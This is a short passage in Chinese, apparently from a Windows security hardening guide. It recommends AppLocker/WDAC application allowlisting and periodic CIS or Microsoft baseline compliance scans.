  4. AppLocker / WDAC：部署应用白名单策略，限制可执行文件和脚本的运行路径，阻止攻击者在可写目录放置恶意 EXE/DLL/MSI。

  5. 定期合规扫描：使用 CIS Benchmark 或 Microsoft Security Baseline 进行定期合规性扫描，确保系统配置符合安全标准。
